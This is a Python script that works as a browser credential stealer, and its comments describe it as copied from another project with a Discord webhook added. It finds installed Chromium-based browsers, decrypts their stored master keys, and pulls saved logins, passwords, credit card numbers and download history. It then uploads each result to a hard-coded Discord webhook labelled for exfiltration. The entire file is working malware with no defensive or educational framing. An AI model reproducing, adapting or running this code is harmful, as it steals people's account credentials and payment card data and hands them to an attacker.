import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook
import random
import string
#pip install pycryptodome pywin32 discord-webhook

#skidripped this \/ theres the credit
#https://github.com/henry-richard7/Browser-password-stealer
#pretty much just added the webhook

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable',
}



data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Month', 'Year', 'Card Number'],
        'decrypt': True
    },
    #'history': {
    #    'query': 'SELECT url, title, last_visit_time FROM urls',
    #    'file': '\\History',
    #    'columns': ['URL', 'Title', 'Visited Time'],
    #    'decrypt': False
    #},
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return
    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return CryptUnprotectData(key[5:], None, None, None, 0)[1]

def decrypt(buff: bytes, key: bytes) -> str:
    try:
        iv = buff[3:15]          
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        return None

def save_results(browser_name, type_of_data, content):
    if content and content.strip():
        random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + ".txt"
        
        temp_dir = os.getenv('TEMP', '/tmp') 
        file_path = os.path.join(temp_dir, random_filename)
        
        with open(file_path, "w", encoding="utf-8") as temp_file:
            temp_file.write(content)
        
        webhook_url = "https://discord.com/api/webhooks/1364682364084551781/NYvk5v_TRcG6ktBac1atc4-uqzmov5ZRX7Ftxk6E-_YUouIgeexnhFWEHWzkjWQuPKsC"  #exfiltrate webhook here
        webhook = DiscordWebhook(
            url=webhook_url,
            content=f"Extracted {type_of_data.replace('_', ' ')} from {browser_name}."
        )
        with open(file_path, "rb") as temp_file:
            webhook.add_file(file=temp_file.read(), filename=random_filename)
        response = webhook.execute()
        
        os.remove(file_path)

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except Exception:
        return result
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes) and row[i]:
                    if type_of_data['columns'][i] == 'Card Number':
                        row[i] = decrypt(row[i], key)
                    else:
                        row[i] = decrypt(row[i], key)
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

def installed_browsers():
    return [x for x in browsers.keys() if os.path.exists(browsers[x] + "\\Local State")]

if __name__ == '__main__':
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        for data_type_name, data_type in data_queries.items():
            profile = "Default"
            data = get_data(browser_path, profile, master_key, data_type)
            save_results(browser, data_type_name, data)
